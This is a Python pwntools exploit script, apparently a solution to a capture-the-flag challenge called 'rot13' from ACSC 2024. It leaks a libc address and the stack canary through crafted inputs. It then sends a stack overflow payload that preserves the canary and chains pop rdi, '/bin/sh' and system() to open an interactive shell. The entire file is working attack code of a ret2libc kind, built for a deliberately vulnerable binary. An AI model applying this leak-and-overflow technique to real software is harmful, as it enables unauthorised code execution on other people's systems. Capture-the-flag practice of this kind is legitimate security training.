from pwn import *

elf = exe = ELF("./rot13_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
io = process("./rot13_patched")

# io = gdb.debug("./rot13_patched", 
# '''
# b *main
# c
# ''')

# io = remote("rot13.chal.2024.ctf.acsc.asia", 9999)
context.log_level = 'debug'

payload = b""
for i in range(0x98, 0xa0): payload += p8(i)

io.recvuntil("Text:")
io.sendline(payload)
io.recvuntil("Result: ")
libc_leak = u64(io.recv(8))

payload = b""
for i in range(0xe8, 0xf0): payload += p8(i)

io.recvuntil("Text:")
io.sendline(payload)
io.recvuntil("Result: ")
canary = u64(io.recv(8))

libc.address = libc_leak - 0x21b780
binsh = libc.address + 0x1d8678
ret = libc.address + 0x29139
pop_rdi = libc.address + 0x2a3e5

payload = b'a'*0x108
payload += p64(canary)
payload += b'a'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])

io.recvuntil("Text:")
io.sendline(payload)

io.recvuntil("Text:")
io.sendline()

io.interactive()
